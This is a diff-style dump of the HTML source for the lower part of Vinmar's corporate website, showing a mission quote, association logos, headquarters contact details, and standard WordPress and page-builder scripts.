+	<div class="fl-module-content fl-node-content">
+		<div class="pp-pullquote">
+	<div class="pp-pullquote-wrapper clearfix">
+				<div class="pp-pullquote-inner">
+			<div class="pp-pullquote-content">
+				<p>“To bring value to the world’s leading producers and users of plastics and chemicals through the supply of best-in-class products and tailored business solutions.”</p>
+			</div>
+					</div>
+	</div>
+</div>
+	</div>
+</div>
+<style>.fl-node-qn4uyrt019g3.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+<div class="fl-module fl-module-pp-logos-grid fl-node-93d274c1ewsb" data-node="93d274c1ewsb" aria-label="Logo Grid & Carousel">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-logos-content is-grid">
+    <div class="pp-logos-wrapper pp-logos-grid" style="">
+				<div class="pp-logo pp-logo-0">
+        	            <div class="pp-logo-inner">
+                <div class="pp-logo-inner-wrap">
+					<div class="logo-image-wrapper">
+						<img decoding="async" class="logo-image" src="https://www.vinmar.com/wp-content/uploads/American-Chemistry-Council-logo-120w.jpg" alt="American Chemistry Council" data-no-lazy="1" />					</div>
+                                            <div class="title-wrapper">
+                            <p class="logo-title">American Chemistry Council</p>
+                        </div>
+                                    </div>
+            </div>
+            		</div>
+				<div class="pp-logo pp-logo-1">
+        	            <div class="pp-logo-inner">
+                <div class="pp-logo-inner-wrap">
+					<div class="logo-image-wrapper">
+						<img decoding="async" class="logo-image" src="https://www.vinmar.com/wp-content/uploads/American-Institute-of-Chemical-Engineers-logo-120w.jpg" alt="American Institute of Chemical Engineers" data-no-lazy="1" />					</div>
+                                            <div class="title-wrapper">
+                            <p class="logo-title">American Institute of Chemical Engineers</p>
+                        </div>
+                                    </div>
+            </div>
+            		</div>
+				<div class="pp-logo pp-logo-2">
+        	            <div class="pp-logo-inner">
+                <div class="pp-logo-inner-wrap">
+					<div class="logo-image-wrapper">
+						<img decoding="async" class="logo-image" src="https://www.vinmar.com/wp-content/uploads/BVCER_ISO-9001-Badge-120x80-1.webp" alt="Bureau Veritas-Certification ISO-9001-2026" data-no-lazy="1" />					</div>
+                                            <div class="title-wrapper">
+                            <p class="logo-title">Bureau Veritas-Certification ISO-9001-2016</p>
+                        </div>
+                                    </div>
+            </div>
+            		</div>
+				<div class="pp-logo pp-logo-3">
+        	            <div class="pp-logo-inner">
+                <div class="pp-logo-inner-wrap">
+					<div class="logo-image-wrapper">
+						<img decoding="async" class="logo-image" src="https://www.vinmar.com/wp-content/uploads/European-Petrochemical-Association-logo-120w.jpg" alt="European Petrochemical Association" data-no-lazy="1" />					</div>
+                                            <div class="title-wrapper">
+                            <p class="logo-title">European Petrochemical Association</p>
+                        </div>
+                                    </div>
+            </div>
+            		</div>
+				<div class="pp-logo pp-logo-4">
+        	            <div class="pp-logo-inner">
+                <div class="pp-logo-inner-wrap">
+					<div class="logo-image-wrapper">
+						<img decoding="async" class="logo-image" src="https://www.vinmar.com/wp-content/uploads/Greater-Houston-Partnership-logo-120w.jpg" alt="Greater Houston Partnership" data-no-lazy="1" />					</div>
+                                            <div class="title-wrapper">
+                            <p class="logo-title">Greater Houston Partnership</p>
+                        </div>
+                                    </div>
+            </div>
+            		</div>
+				<div class="pp-logo pp-logo-5">
+        	            <div class="pp-logo-inner">
+                <div class="pp-logo-inner-wrap">
+					<div class="logo-image-wrapper">
+						<img decoding="async" class="logo-image" src="https://www.vinmar.com/wp-content/uploads/Gulf-Petrochemicals-and-Chemicals-Association-logo-120w.jpg" alt="Gulf Petrochemicals and Chemicals Association" data-no-lazy="1" />					</div>
+                                            <div class="title-wrapper">
+                            <p class="logo-title">Gulf Petrochemicals and Chemicals Association</p>
+                        </div>
+                                    </div>
+            </div>
+            		</div>
+			</div>
+	</div>
+	</div>
+</div>
+	</div>
+<style>.fl-node-8pdax5be4rzj.fl-animation:not(.fl-animated){opacity:0}</style></div>
+</div>
+	</div>
+		</div>
+	</div>
+</div>
+<div id="global-presence" class="fl-row fl-row-full-width fl-row-bg-none fl-node-htdeu8bgm7c5 fl-row-default-height fl-row-align-center" data-node="htdeu8bgm7c5">
+	<div class="fl-row-content-wrap">
+						<div class="fl-row-content fl-row-fixed-width fl-node-content">
+		
+<div class="fl-col-group fl-node-rdiwha6g5nzy" data-node="rdiwha6g5nzy">
+			<div class="fl-col fl-node-907vejl2szag fl-col-bg-color" data-node="907vejl2szag">
+	<div class="fl-col-content fl-node-content"><h2  class="fl-module fl-module-heading fl-heading fl-heading-text fl-node-e6fu52ism4bj fl-animation fl-fade-up" data-node="e6fu52ism4bj" data-animation-delay="0" data-animation-duration="1" aria-label="Heading">
+			A Global	</h2>
+<style>.fl-node-e6fu52ism4bj.fl-animation:not(.fl-animated){opacity:0}</style><div  class="fl-module fl-module-box fl-node-riga98k470vt" data-node="riga98k470vt" aria-label="Box">
+	<div class="fl-module fl-module-pp-image fl-node-5wma76n0jxiz blendmode-overlay" data-node="5wma76n0jxiz" aria-label="Image">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-photo-container">
+	<div class="pp-photo pp-photo-align-left pp-photo-align-responsive-default" itemscope itemtype="http://schema.org/ImageObject">
+		<div class="pp-photo-content">
+			<div class="pp-photo-content-inner">
+									<img fetchpriority="high" decoding="async" class="pp-photo-img wp-image-102 size-full" src="https://www.vinmar.com/wp-content/uploads/Vinmar-icon-White.png" alt="Vinmar icon-White" itemprop="image" height="1080" width="1610" srcset="https://www.vinmar.com/wp-content/uploads/Vinmar-icon-White.png 1610w, https://www.vinmar.com/wp-content/uploads/Vinmar-icon-White-800x537.png 800w, https://www.vinmar.com/wp-content/uploads/Vinmar-icon-White-1600x1073.png 1600w, https://www.vinmar.com/wp-content/uploads/Vinmar-icon-White-400x268.png 400w, https://www.vinmar.com/wp-content/uploads/Vinmar-icon-White-768x515.png 768w, https://www.vinmar.com/wp-content/uploads/Vinmar-icon-White-1536x1030.png 1536w" sizes="(max-width: 1610px) 100vw, 1610px" title="Vinmar icon-White"  />
+					<div class="pp-overlay-bg"></div>
+												</div>
+					</div>
+	</div>
+</div>
+	</div>
+</div>
+<h2  class="fl-module fl-module-heading fl-heading fl-heading-text fl-node-yojebkiurp9c fl-animation fl-fade-up" data-node="yojebkiurp9c" data-animation-delay="0" data-animation-duration="1" aria-label="Heading">
+			Reach	</h2>
+<style>.fl-node-yojebkiurp9c.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+<div  class="fl-module fl-module-box fl-node-csyw3tg1ja7m" data-node="csyw3tg1ja7m" aria-label="Box">
+	<div class="fl-module fl-module-pp-heading fl-node-cfu2zyn0s8qr fl-animation fl-fade-up" data-node="cfu2zyn0s8qr" data-animation-delay="0" data-animation-duration="1" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Global Headquarters</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<p><strong>Vinmar</strong><br />16825 Northchase Drive,<br />Suite 1400 <br />Houston, Texas 77060 <br />Phone <a href="tel:12816181300">1.281.618.1300</a> <br />Fax 1.281.618.1399</p>		</div>
+	
+	</div>
+	</div>
+</div>
+<style>.fl-node-cfu2zyn0s8qr.fl-animation:not(.fl-animated){opacity:0}</style><div class="fl-module fl-module-pp-heading fl-node-8ge4o7nplt1r fl-animation fl-fade-up" data-node="8ge4o7nplt1r" data-animation-delay="0.5" data-animation-duration="1" aria-label="Smart Headings">
+	<div class="fl-module-content fl-node-content">
+		<div class="pp-heading-content">
+		<div class="pp-heading  pp-">
+		
+		<h6 class="heading-title">
+
+			
+			<span class="title-text pp-primary-title">Present in over 130 countries & Territories</span>
+
+			
+			
+		</h6>
+
+		
+	</div>
+
+			<div class="pp-sub-heading">
+			<p style="text-align: justify; text-justify: inter-word;">Argentina Australia Bangladesh Belgium Brazil Burma Canada Chile China Colombia <span style="display: inline-block;">Costa Rica</span> Ecuador Egypt Germany Ghana India Indonesia Israel Lebanon Mexico Morocco Netherlands Nigeria Pakistan Peru Philippine Poland Singapore <span style="display: inline-block;">South Africa</span> <span style="display: inline-block;">South Korea</span> Spain Taiwan Thailand Turkey UAE <span style="display: inline-block;">United States</span> Vietnam</p>
+		</div>
+	
+	</div>
+	</div>
+</div>
+<style>.fl-node-8ge4o7nplt1r.fl-animation:not(.fl-animated){opacity:0}</style>	</div>
+</div>
+</div>
+	</div>
+		</div>
+	</div>
+</div>
+<div class="fl-row fl-row-full-width fl-row-bg-color fl-node-j4okawys5u1l fl-row-default-height fl-row-align-center" data-node="j4okawys5u1l">
+	<div class="fl-row-content-wrap">
+						<div class="fl-row-content fl-row-full-width fl-node-content">
+		
+<div class="fl-col-group fl-node-7dlhk3niq4yf" data-node="7dlhk3niq4yf">
+			<div class="fl-col fl-node-vpyutg5md91c fl-col-bg-color" data-node="vpyutg5md91c">
+	<div class="fl-col-content fl-node-content"><div  class="fl-module fl-module-box fl-node-9pbjokc1yhr2" data-node="9pbjokc1yhr2" aria-label="Box">
+	<figure class="fl-module fl-module-photo fl-photo fl-photo-align-left fl-node-u31nhg4dj57c" data-node="u31nhg4dj57c" aria-label="Photo" itemscope itemtype="https://schema.org/ImageObject">
+	<div class="fl-photo-content fl-photo-img-webp">
+				<a href="https://www.vinmar.com/" target="_self" itemprop="url">
+					<img decoding="async" class="fl-photo-img wp-image-11460 size-full" src="https://www.vinmar.com/wp-content/uploads/Vinmar-logo-registered-wordmark-white.webp" alt="Vinmar" height="40" width="263" title="Vinmar logo registered-wordmark white" loading="lazy" />
+							</a>
+					</div>
+	</figure>
+<div  class="fl-module fl-module-box fl-node-jkmvzs2iorp1" data-node="jkmvzs2iorp1" aria-label="Box">
+	<div class="fl-module fl-module-pp-social-icons fl-node-fdgeq6plorti" data-node="fdgeq6plorti" aria-label="Social Icons">
+	<div class="fl-module-content fl-node-content">
+		
+<div class="pp-social-icons pp-social-icons-horizontal">
+	<span class="pp-social-icon" itemscope itemtype="https://schema.org/Organization">
+		<link itemprop="url" href="https://www.vinmar.com">
+		<a itemprop="sameAs" href="https://www.linkedin.com/company/vinmar-international/" target="_blank" title="" aria-label="" role="button" rel="noopener noreferrer external" >
+							<i class="fab fa-linkedin-in"></i>
+					</a>
+	</span>
+	</div>
+	</div>
+</div>
+<div  class="fl-module fl-module-rich-text fl-rich-text fl-node-2tg0rm7dkbcj" data-node="2tg0rm7dkbcj" aria-label="Text Editor">
+	<p>© 2026 Vinmar. All Rights Reserved.<br />
+| <a href="tel:12816181300" target="_blank" rel="noopener">+1 281 618 1300</a> | <a href="mailto:{customer_support_email}" target="_blank" rel="noopener">admin@vinmar.com</a></p>
+</div>
+	</div>
+	</div>
+</div>
+</div>
+	</div>
+		</div>
+	</div>
+</div>
+</div>	</div><!-- .fl-post-content -->
+	
+</article>
+
+<!-- .fl-post -->
+		</div>
+	</div>
+</div>
+
+
+	</div><!-- .fl-page-content -->
+		</div><!-- .fl-page -->
+<script>
+				( function() {
+					const style = document.createElement( 'style' );
+					style.appendChild( document.createTextNode( '#frm_field_32_container {visibility:hidden;overflow:hidden;width:0;height:0;position:absolute;}' ) );
+					document.head.appendChild( style );
+					document.currentScript?.remove();
+				} )();
+			</script><script type="speculationrules">
+{"prefetch":[{"source":"document","where":{"and":[{"href_matches":"/*"},{"not":{"href_matches":["/wp-*.php","/wp-admin/*","/wp-content/uploads/*","/wp-content/*","/wp-content/plugins/*","/wp-content/themes/vinm-bbchild/*","/wp-content/themes/bb-theme/*","/*\\?(.+)"]}},{"not":{"selector_matches":"a[rel~=\"nofollow\"]"}},{"not":{"selector_matches":".no-prefetch, .no-prefetch a"}}]},"eagerness":"conservative"}]}
+</script>
+<script id="jquery-waypoints-js" src="https://www.vinmar.com/wp-content/plugins/bb-plugin/js/libs/jquery.waypoints.min.js?ver=2.11"></script>
+<script id="imagesloaded-js" src="https://www.vinmar.com/wp-content/plugins/bb-plugin/js/libs/jquery.imagesloaded.min.js?ver=2.11"></script>
+<script id="fl-builder-layout-15-js" src="https://www.vinmar.com/wp-content/uploads/bb-plugin/cache/15-layout.js?ver=0e4281a1143e7f983e32a2974dbad752"></script>
+<script id="stickThis-js-extra">
+var sticky_anything_engage = {"element":"#sticky-menu","topspace":"24","minscreenwidth":"0","maxscreenwidth":"999999","zindex":"9999","legacymode":"","dynamicmode":"","debugmode":"","pushup":"","adminbar":"1"};
+//# sourceURL=stickThis-js-extra
+</script>
+<script id="stickThis-js" src="https://www.vinmar.com/wp-content/plugins/sticky-menu-or-anything-on-scroll/assets/js/stickThis.js?ver=2.1.1"></script>
+<script id="jquery-throttle-js" src="https://www.vinmar.com/wp-content/plugins/bb-plugin/js/libs/jquery.ba-throttle-debounce.min.js?ver=2.11"></script>
+<script id="jquery-magnificpopup-js" src="https://www.vinmar.com/wp-content/plugins/bb-plugin/js/libs/jquery.magnificpopup.min.js?ver=2.11"></script>
+<script id="bootstrap-4-js" src="https://www.vinmar.com/wp-content/themes/bb-theme/js/bootstrap-4.min.js?ver=1.7.19.2"></script>
+<script id="fl-automator-js-extra">
+var themeopts = {"medium_breakpoint":"992","mobile_breakpoint":"768","lightbox":"enabled","scrollTopPosition":"800"};
+//# sourceURL=fl-automator-js-extra
+</script>
+<script id="fl-automator-js" src="https://www.vinmar.com/wp-content/themes/bb-theme/js/theme.min.js?ver=1.7.19.2"></script>
+<script id="formidable-js-extra">
+var frm_js = {"ajax_url":"https://www.vinmar.com/wp-admin/admin-ajax.php","images_url":"https://www.vinmar.com/wp-content/plugins/formidable/images","loading":"Loading\u2026","remove":"Remove","offset":"4","nonce":"a49ff46203","id":"ID","no_results":"No results match","file_spam":"That file looks like Spam.","calc_error":"There is an error in the calculation in the field with key","empty_fields":"Please complete the preceding required fields before uploading a file.","focus_first_error":"1","include_alert_role":"1","include_resend_email":""};
+var frm_password_checks = {"eight-char":{"label":"Eight characters minimum","regex":"/^.{8,}$/","message":"Passwords require at least 8 characters"},"lowercase":{"label":"One lowercase letter","regex":"#[a-z]+#","message":"Passwords must include at least one lowercase letter"},"uppercase":{"label":"One uppercase letter","regex":"#[A-Z]+#","message":"Passwords must include at least one uppercase letter"},"number":{"label":"One number","regex":"#[0-9]+#","message":"Passwords must include at least one number"},"special-char":{"label":"One special character","regex":"/(?=.*[^a-zA-Z0-9])/","message":"Password is invalid"}};
+var frmCheckboxI18n = {"errorMsg":{"min_selections":"This field requires a minimum of %1$d selected options but only %2$d were submitted."}};
+//# sourceURL=formidable-js-extra
+</script>
+<script id="formidable-js" src="https://www.vinmar.com/wp-content/plugins/formidable-pro/js/frm.min.js?ver=6.33.1-jquery"></script>
+<script id="formidable-js-after">
+window.frm_js.repeaterRowDeleteConfirmation = "Are you sure you want to delete this row?";
+window.frm_js.datepickerLibrary = "default";
+//# sourceURL=formidable-js-after
+</script>
+<script id="captcha-api-js" defer="defer" async="async" src="https://www.google.com/recaptcha/api.js?onload=frmRecaptcha&#038;render=explicit&#038;ver=3"></script>
+<script id="fl-builder-layout-95-js" src="https://www.vinmar.com/wp-content/uploads/bb-plugin/cache/95-layout-partial.js?ver=39704adb165daabad25ba787b0d0fd09"></script>
+<script id="wp-emoji-settings" type="application/json">
+{"baseUrl":"https://s.w.org/images/core/emoji/17.0.2/72x72/","ext":".png","svgUrl":"https://s.w.org/images/core/emoji/17.0.2/svg/","svgExt":".svg","source":{"concatemoji":"https://www.vinmar.com/wp-includes/js/wp-emoji-release.min.js?ver=7.0.2"}}
+</script>
+<script type="module">
+/*! This file is auto-generated */
+const a=JSON.parse(document.getElementById("wp-emoji-settings").textContent),o=(window._wpemojiSettings=a,"wpEmojiSettingsSupports"),s=["flag","emoji"];function i(e){try{var t={supportTests:e,timestamp:(new Date).valueOf()};sessionStorage.setItem(o,JSON.stringify(t))}catch(e){}}function c(e,t,n){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);t=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(n,0,0);const a=new Uint32Array(e.getImageData(0,0,e.canvas.width,e.canvas.height).data);return t.every((e,t)=>e===a[t])}function p(e,t){e.clearRect(0,0,e.canvas.width,e.canvas.height),e.fillText(t,0,0);var n=e.getImageData(16,16,1,1);for(let e=0;e<n.data.length;e++)if(0!==n.data[e])return!1;return!0}function u(e,t,n,a){switch(t){case"flag":return n(e,"\ud83c\udff3\ufe0f\u200d\u26a7\ufe0f","\ud83c\udff3\ufe0f\u200b\u26a7\ufe0f")?!1:!n(e,"\ud83c\udde8\ud83c\uddf6","\ud83c\udde8\u200b\ud83c\uddf6")&&!n(e,"\ud83c\udff4\udb40\udc67\udb40\udc62\udb40\udc65\udb40\udc6e\udb40\udc67\udb40\udc7f","\ud83c\udff4\u200b\udb40\udc67\u200b\udb40\udc62\u200b\udb40\udc65\u200b\udb40\udc6e\u200b\udb40\udc67\u200b\udb40\udc7f");case"emoji":return!a(e,"\ud83e\u1fac8")}return!1}function f(e,t,n,a){let r;const o=(r="undefined"!=typeof WorkerGlobalScope&&self instanceof WorkerGlobalScope?new OffscreenCanvas(300,150):document.createElement("canvas")).getContext("2d",{willReadFrequently:!0}),s=(o.textBaseline="top",o.font="600 32px Arial",{});return e.forEach(e=>{s[e]=t(o,e,n,a)}),s}function r(e){var t=document.createElement("script");t.src=e,t.defer=!0,document.head.appendChild(t)}a.supports={everything:!0,everythingExceptFlag:!0},new Promise(t=>{let n=function(){try{var e=JSON.parse(sessionStorage.getItem(o));if("object"==typeof e&&"number"==typeof e.timestamp&&(new Date).valueOf()<e.timestamp+604800&&"object"==typeof e.supportTests)return e.supportTests}catch(e){}return null}();if(!n){if("undefined"!=typeof Worker&&"undefined"!=typeof OffscreenCanvas&&"undefined"!=typeof URL&&URL.createObjectURL&&"undefined"!=typeof Blob)try{var e="postMessage("+f.toString()+"("+[JSON.stringify(s),u.toString(),c.toString(),p.toString()].join(",")+"));",a=new Blob([e],{type:"text/javascript"});const r=new Worker(URL.createObjectURL(a),{name:"wpTestEmojiSupports"});return void(r.onmessage=e=>{i(n=e.data),r.terminate(),t(n)})}catch(e){}i(n=f(s,u,c,p))}t(n)}).then(e=>{for(const n in e)a.supports[n]=e[n],a.supports.everything=a.supports.everything&&a.supports[n],"flag"!==n&&(a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&a.supports[n]);var t;a.supports.everythingExceptFlag=a.supports.everythingExceptFlag&&!a.supports.flag,a.supports.everything||((t=a.source||{}).concatemoji?r(t.concatemoji):t.wpemoji&&t.twemoji&&(r(t.twemoji),r(t.wpemoji)))});
+//# sourceURL=https://www.vinmar.com/wp-includes/js/wp-emoji-loader.min.js
+</script>
+<script>
+/*<![CDATA[*/
+/*]]>*/
+</script>
+<script>;(function($){if($(window).width()<=768&&$(window).width()>=481){$('.fl-node-xb8nark7jdp2 .pp-heading-separator, .fl-node-xb8nark7jdp2 .pp-heading').removeClass('pp-');$('.fl-node-xb8nark7jdp2 .pp-heading-separator, .fl-node-xb8nark7jdp2 .pp-heading').addClass('pp-tablet-');}
+if($(window).width()<=480){$('.fl-node-xb8nark7jdp2 .pp-heading-separator, .fl-node-xb8nark7jdp2 .pp-heading').removeClass('pp-');$('.fl-node-xb8nark7jdp2 .pp-heading-separator, .fl-node-xb8nark7jdp2 .pp-heading').addClass('pp-mobile-');}})(jQuery);(function($){if($(window).width()<=768&&$(window).width()>=481){$('.fl-node-xnbceitf3m54 .pp-heading-separator, .fl-node-xnbceitf3m54 .pp-heading').removeClass('pp-');$('.fl-node-xnbceitf3m54 .pp-heading-separator, .fl-node-xnbceitf3m54 .pp-heading').addClass('pp-tablet-');}
+if($(window).width()<=480){$('.fl-node-xnbceitf3m54 .pp-heading-separator, .fl-node-xnbceitf3m54 .pp-heading').removeClass('pp-');$('.fl-node-xnbceitf3m54 .pp-heading-separator, .fl-node-xnbceitf3m54 .pp-heading').addClass('pp-mobile-');}})(jQuery);(function($){if($(window).width()<=768&&$(window).width()>=481){$('.fl-node-dafey5tu81qk .pp-heading-separator, .fl-node-dafey5tu81qk .pp-heading').removeClass('pp-');$('.fl-node-dafey5tu81qk .pp-heading-separator, .fl-node-dafey5tu81qk .pp-heading').addClass('pp-tablet-');}
+if($(window).width()<=480){$('.fl-node-dafey5tu81qk .pp-heading-separator, .fl-node-dafey5tu81qk .pp-heading').removeClass('pp-');$('.fl-node-dafey5tu81qk .pp-heading-separator, .fl-node-dafey5tu81qk .pp-heading').addClass('pp-mobile-');}})(jQuery);(function($){if($(window).width()<=768&&$(window).width()>=481){$('.fl-node-9dbn8axq32jt .pp-heading-separator, .fl-node-9dbn8axq32jt .pp-heading').removeClass('pp-');$('.fl-node-9dbn8axq32jt .pp-heading-separator, .fl-node-9dbn8axq32jt .pp-heading').addClass('pp-tablet-');}
+if($(window).width()<=480){$('.fl-node-9dbn8axq32jt .pp-heading-separator, .fl-node-9dbn8axq32jt .pp-heading').removeClass('pp-');$('.fl-node-9dbn8axq32jt .pp-heading-separator, .fl-node-9dbn8axq32jt .pp-heading').addClass('pp-mobile-');}})(jQuery);(function($){if($(window).width()<=768&&$(window).width()>=481){$('.fl-node-w049ze8huqds .pp-heading-separator, .fl-node-w049ze8huqds .pp-heading').removeClass('pp-');$('.fl-node-w049ze8huqds .pp-heading-separator, .fl-node-w049ze8huqds .pp-heading').addClass('pp-tablet-');}
+if($(window).width()<=480){$('.fl-node-w049ze8huqds .pp-heading-separator, .fl-node-w049ze8huqds .pp-heading').removeClass('pp-');$('.fl-node-w049ze8huqds .pp-heading-separator, .fl-node-w049ze8huqds .pp-heading').addClass('pp-mobile-');}})(jQuery);(function($){if($(window).width()<=768&&$(window).width()>=481){$('.fl-node-8ducre3akzmx .pp-heading-separator, .fl-node-8ducre3akzmx .pp-heading').removeClass('pp-');$('.fl-node-8ducre3akzmx .pp-heading-separator, .fl-node-8ducre3akzmx .pp-heading').addClass('pp-tablet-');}
+if($(window).width()<=480){$('.fl-node-8ducre3akzmx .pp-heading-separator, .fl-node-8ducre3akzmx .pp-heading').removeClass('pp-');$('.fl-node-8ducre3akzmx .pp-heading-separator, .fl-node-8ducre3akzmx .pp-heading').addClass('pp-mobile-');}})(jQuery);(function($){PPHeaderLayout={win:null,body:null,header:null,overlay:false,hasAdminBar:false,init:function(){var editing=$('html.fl-builder-edit').length,header=$('.fl-builder-content[data-type=header]');if(!editing&&header.length){header.imagesLoaded(function(){this.win=$(window);this.body=$('body');this.header=header.eq(0);this.overlay=!!Number(header.attr('data-overlay'));this.hasAdminBar=!!$('body.admin-bar').length;if(Number(header.attr('data-sticky'))){this.header.data('original-top',this.header.offset().top);this.win.on('resize',$.throttle(500,this._initSticky.bind(this)));this._initSticky();if(Number(header.attr('data-shrink'))){this.header.data('original-height',this.header.outerHeight());this.win.on('resize',$.throttle(500,this._initShrink.bind(this)));this._initShrink();}}}.bind(this));}},_initSticky:function(){var devices=this.header.data('sticky-devices'),breakpoints=FLBuilderLayoutConfig.breakpoints,matches=this.win.width()>=breakpoints.medium;if('undefined'!==typeof devices){devices=devices.split(',');if(-1!==$.inArray('tablet',devices)&&-1!==$.inArray('mobile',devices)){matches=true;}else if(-1!==$.inArray('tablet',devices)){matches=this.win.width()>breakpoints.small;}else if(-1!==$.inArray('mobile',devices)){matches=this.win.width()<=breakpoints.small||this.win.width()>breakpoints.medium;}}
+if(matches){this.win.on('scroll.bb-powerpack-header-sticky',this._doSticky.bind(this));this._doSticky();}else{this.win.off('scroll.bb-powerpack-header-sticky');this.header.removeClass('bb-powerpack-header-sticky');this.body.css('padding-top','0');}},_doSticky:function(){var winTop=this.win.scrollTop(),headerTop=this.header.data('original-top'),hasStickyClass=this.header.hasClass('bb-powerpack-header-sticky'),hasScrolledClass=this.header.hasClass('bb-powerpack-header-scrolled');if(this.hasAdminBar){winTop+=32;}
+if(winTop>=headerTop){if(!hasStickyClass){this.header.addClass('bb-powerpack-header-sticky');if(!this.overlay){this.body.css('padding-top',this.header.outerHeight()+'px');}}}
+if(winTop>headerTop){if(!hasScrolledClass){this.header.addClass('bb-powerpack-header-scrolled');}}else if(hasScrolledClass){this.header.removeClass('bb-powerpack-header-scrolled');}},_initShrink:function(){var devices=this.header.data('sticky-devices'),breakpoints=FLBuilderLayoutConfig.breakpoints,matches=this.win.width()>=breakpoints.medium;if('undefined'!==typeof devices){devices=devices.split(',');if($.inArray('tablet',devices)&&$.inArray('mobile',devices)){matches=true;}else if($.inArray('tablet',devices)){matches=this.win.width()>breakpoints.small;}else if($.inArray('mobile',devices)){matches=this.win.width()<=breakpoints.small||this.win.width()>breakpoints.medium;}}
+if(matches){this.win.on('scroll.bb-powerpack-header-shrink',this._doShrink.bind(this));this._setImageMaxHeight();if(this.win.scrollTop()>0){this._doShrink();}}else{this.body.css('padding-top','0');this.win.off('scroll.bb-powerpack-header-shrink');this._removeShrink();this._removeImageMaxHeight();}},_doShrink:function(){var winTop=this.win.scrollTop(),headerTop=this.header.data('original-top'),headerHeight=this.header.data('original-height'),hasClass=this.header.hasClass('bb-powerpack-header-shrink');if(this.hasAdminBar){winTop+=32;}
+if(winTop>headerHeight){if(!hasClass){this.header.addClass('bb-powerpack-header-shrink');this.header.find('.fl-row-content-wrap').each(function(){var row=$(this);if(parseInt(row.css('padding-bottom'))>5){row.addClass('bb-powerpack-header-shrink-row-bottom');}
+if(parseInt(row.css('padding-top'))>5){row.addClass('bb-powerpack-header-shrink-row-top');}});this.header.find('.fl-module-content').each(function(){var module=$(this);if(parseInt(module.css('margin-bottom'))>5){module.addClass('bb-powerpack-header-shrink-module-bottom');}
+if(parseInt(module.css('margin-top'))>5){module.addClass('bb-powerpack-header-shrink-module-top');}});}}else if(hasClass){this._removeShrink();}},_removeShrink:function(){var rows=this.header.find('.fl-row-content-wrap'),modules=this.header.find('.fl-module-content');rows.removeClass('bb-powerpack-header-shrink-row-bottom');rows.removeClass('bb-powerpack-header-shrink-row-top');modules.removeClass('bb-powerpack-header-shrink-module-bottom');modules.removeClass('bb-powerpack-header-shrink-module-top');this.header.removeClass('bb-powerpack-header-shrink');},_setImageMaxHeight:function(){var head=$('head'),stylesId='fl-header-styles-'+this.header.data('post-id'),styles='',images=this.header.find('.fl-module-content img');if($('#'+stylesId).length){return;}
+images.each(function(i){var image=$(this),height=image.height(),node=image.closest('.fl-module').data('node'),className='fl-node-'+node+'-img-'+i;image.addClass(className);image.attr('data-no-lazy',1);styles+='.'+className+' { max-height: '+height+'px }';});if(''!==styles){head.append('<style id="'+stylesId+'">'+styles+'</style>');}},_removeImageMaxHeight:function(){$('#fl-header-styles-'+this.header.data('post-id')).remove();},};$(function(){PPHeaderLayout.init();});})(jQuery);</script></body>
+</html>
